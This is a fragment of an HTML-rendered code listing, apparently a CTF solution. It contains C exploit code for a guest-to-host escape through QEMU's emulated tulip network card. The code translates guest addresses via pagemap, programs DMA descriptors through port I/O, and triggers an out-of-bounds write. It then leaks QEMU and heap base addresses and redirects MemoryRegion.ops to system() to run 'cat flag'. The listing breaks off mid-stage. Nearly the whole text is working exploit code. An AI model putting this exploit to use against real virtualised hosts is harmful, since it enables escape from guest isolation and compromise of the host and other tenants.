class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) <span class="comment">// 4096</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMIO_BASE 0x000000000000c000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSR(_x) ((_x) &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSR5_TS_SUSPENDED 6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"></span><br><span class="line">tulip_write -&gt;</span><br><span class="line">tulip_xmit_list_update -&gt; </span><br><span class="line">tulip_copy_tx_buffers -&gt;         </span><br><span class="line">pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr1, s-&gt;tx_frame + s-&gt;tx_frame_len, len1); -&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">tulip_ts</span><span class="params">(TULIPState *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (s-&gt;csr[<span class="number">5</span>] &gt;&gt; CSR5_TS_SHIFT) &amp; CSR5_TS_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> status;</span><br><span class="line">    <span class="keyword">uint32_t</span> control;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_addr1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_addr2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint64_t</span> port)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> val;</span><br><span class="line">    val = inw(PMIO_BASE + port);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint64_t</span> port, <span class="keyword">uint64_t</span> val)</span> </span>&#123;</span><br><span class="line">    outw(val, PMIO_BASE + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="keyword">uint64_t</span> port, <span class="keyword">uint64_t</span> val)</span> </span>&#123;</span><br><span class="line">    outl(val, PMIO_BASE + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate descriptor</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> *<span class="title">tx_desc</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct tulip_descriptor));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> *<span class="title">rx_desc</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct tulip_descriptor));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *recv_buf = <span class="built_in">malloc</span>(<span class="number">0x9000</span>);</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(recv_buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x9000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>); <span class="comment">// TDES1_FS, clean tx_frame_len</span></span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the physical address of the descriptor</span></span><br><span class="line">    <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set CSR5_TS_SUSPENDED</span></span><br><span class="line">    pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">// CSR6_ST</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);   <span class="comment">// tx_frame_len should be 0x400 now</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);   </span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);   <span class="comment">// tx_frame_len shoule be 0x800 now</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// tulip_tx: tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> &#123;</span>                   <span class="comment">// control the following fields in TULIPState</span></span><br><span class="line">        <span class="keyword">int</span> tx_frame_len;</span><br><span class="line">        <span class="keyword">int</span> rx_frame_len;</span><br><span class="line">        <span class="keyword">int</span> rx_frame_size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint32_t</span> rx_status;</span><br><span class="line">        <span class="keyword">uint8_t</span> filter[<span class="number">16</span>][<span class="number">6</span>];</span><br><span class="line">    &#125;;</span><br><span class="line">    len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">    oob_data-&gt;tx_frame_len = <span class="number">0x400</span> - len1;</span><br><span class="line">    oob_data-&gt;rx_frame_len = <span class="number">0x900</span>;</span><br><span class="line">    oob_data-&gt;rx_frame_size = <span class="number">2048</span>*<span class="number">2</span> + <span class="number">0x900</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff</span></span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>);</span><br><span class="line">    pmio_write(CSR(<span class="number">6</span>), <span class="number">0x800</span> | (<span class="number">1u</span> &lt;&lt; <span class="number">13</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">1</span>));         <span class="comment">// CSR6_OM_SHIFT trigger tulip_receive</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] OOB write tx_frame_len...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rx_len1, rx_len2;</span><br><span class="line">    rx_len1 = <span class="number">0x400</span>;</span><br><span class="line">    rx_len2 = <span class="number">0</span>;</span><br><span class="line">    rx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>); <span class="comment">// RDES0_OWN</span></span><br><span class="line">    rx_desc-&gt;buf_addr1  = gva_to_gpa(recv_buf);</span><br><span class="line">    rx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    rx_desc-&gt;control    = rx_len2 | rx_len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set rx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> rx_desc_gpa = gva_to_gpa(rx_desc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] rx_desc_gpa: 0x%lx\n&quot;</span>, rx_desc_gpa);</span><br><span class="line">    pmio_writel(CSR(<span class="number">3</span>), rx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak\n&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *cur = (<span class="keyword">char</span> *)recv_buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx 0x%016lx\n&quot;</span>, *(<span class="keyword">size_t</span> *)cur, *(<span class="keyword">size_t</span> *)(cur+<span class="number">8</span>));</span><br><span class="line">        cur += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cur = (<span class="keyword">char</span> *)recv_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> qemu_base = ((<span class="keyword">uint64_t</span> *)cur)[<span class="number">0x1d</span>] - <span class="number">0x755f9f</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = ((<span class="keyword">uint64_t</span> *)cur)[<span class="number">22</span>] - <span class="number">0xe11380</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> qemu_plt_system = qemu_base+<span class="number">2859620</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> frame_base = heap_base+<span class="number">0xe0fcf0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] continue...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] qemu_base: 0x%lx\n&quot;</span>, qemu_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] heap_base: 0x%lx\n&quot;</span>, heap_base);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage2\n&quot;</span>); &#123;</span><br><span class="line"></span><br><span class="line">        len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CSR5_TS_SUSPENDED</span></span><br><span class="line">        pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">// CSR6_ST</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// tulip_tx: tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">        len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">        oob_data-&gt;tx_frame_len = <span class="number">-0x3350</span> - <span class="number">0x70</span>;</span><br><span class="line">        oob_data-&gt;rx_frame_len = <span class="number">0</span>;</span><br><span class="line">        oob_data-&gt;rx_frame_size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff </span></span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        pmio_write(CSR(<span class="number">6</span>), <span class="number">0x800</span> | (<span class="number">1u</span> &lt;&lt; <span class="number">13</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">1</span>)); <span class="comment">// trigger tulip_tx</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">uint64_t</span> *binsh = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        binsh[<span class="number">0</span>] = <span class="number">7449354444534473059</span>; <span class="comment">// catflag</span></span><br><span class="line">        binsh[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        len1 = <span class="number">16</span>;</span><br><span class="line">        len2 = <span class="number">0</span>;</span><br><span class="line">        tx_desc-&gt;status = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1 = gva_to_gpa(binsh);</span><br><span class="line">        tx_desc-&gt;buf_addr2 = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// now control MemoryRegion.ops</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage3\n&quot;</span>); &#123;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">0</span>] = qemu_plt_system;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">1</span>] = qemu_plt_system;</span><br><span class="line">        </span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span 